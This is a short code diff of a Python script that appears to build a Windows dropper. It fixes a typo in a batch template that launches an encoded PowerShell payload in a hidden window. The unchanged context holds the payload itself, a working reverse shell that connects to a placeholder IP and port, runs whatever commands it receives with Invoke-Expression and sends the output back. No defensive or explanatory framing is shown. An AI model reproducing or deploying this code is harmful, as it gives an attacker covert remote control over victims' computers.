@@ -6,7 +6,7 @@ import colorama
 colorama.init()
 
 payload_tcp = """While($True){\nTry{\n$client = New-Object System.Net.Sockets.TcpClient;\n$client.Connect("<ip>", <port>);\n$stream = $client.GetStream();\nWhile ($True) {;\n$buffer = New-Object System.Byte[] 60000;\n$read = $stream.Read($buffer, 0, 60000);\n$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);\n$Output = Invoke-Expression $msg 2>&1 | Out-String;\n$message = [System.Text.Encoding]::ASCII.GetBytes($Output);\n$stream.Write($message, 0, $message.Length);\n}\n} catch {\n}\n}"""
-code = """@ecgo off\npowershell -Command "Start-Process powershell.exe {powershell.exe -enc <payload_tcp> } -WindowStyle hidden" """
+code = """@echo off\npowershell -Command "Start-Process powershell.exe {powershell.exe -enc <payload_tcp> } -WindowStyle hidden" """
 
 if len(sys.argv) != 3:
     print("error no argv")
